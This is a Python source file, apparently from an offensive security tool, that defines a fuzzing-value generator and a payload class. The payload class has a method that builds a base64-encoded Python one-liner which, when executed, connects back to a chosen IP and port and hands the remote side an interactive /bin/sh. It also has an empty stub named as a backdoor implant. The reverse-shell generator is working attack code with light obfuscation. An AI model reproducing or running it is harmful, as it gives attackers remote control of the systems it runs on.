import os
import random
import secrets
from datetime import datetime
from random import randint, choice
import mimesis
import base64


class VMNFPayloads:
    def __init__(self, **settings):
        '''VMNF Payloads'''

        self.settings = settings
        self.patterns = settings['patterns']
    
    def get_random_int(self):
        return randint(0, 
            choice(range(datetime.now().minute + datetime.now().second + len(self.patterns) * choice(bytes(range(256))))))
    def get_random_unicode(self):
        return choice(''.join(tuple(chr(i) for i in range(32, 0x110000) if chr(i).isprintable())))
    def get_os_urandom(self):
        return os.urandom(choice(range(18)))
    def get_secure_random_string(self):
        return secrets.token_urlsafe(choice(range(33)))
    def get_random_float(self):
        return random.random()
    def get_random_credential(self):
        gen = mimesis.Generic(choice([loc for loc in mimesis.locales.LIST_OF_LOCALES]))
        return {'username':gen.person.username(),'password':gen.person.password()}

    
class pypays:
    def __init__(self):
        '''*'''
    def olbsp(
        self,
        ip=False, 
        port=False
        ):
        ''' - One-liner /bin/sh payload - '''
        
        # 0-65535 check to prevent overflowerror
        return('import base64;exec(base64.b64decode(' + \
            str(base64.b64encode(\
                """import os,\
                socket,\
                subprocess;\
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
                s.connect(('{}',{}));\
                os.dup2(s.fileno(),0);\
                os.dup2(s.fileno(),1);\
                os.dup2(s.fileno(),2);\
                p=subprocess.Popen(["/bin/sh","-i"],close_fds=True);
                """.format(ip,port).encode('ascii')
                )
            ) + '))'
        )


    def pybackdoor(self):
        '''python backdoor implante'''
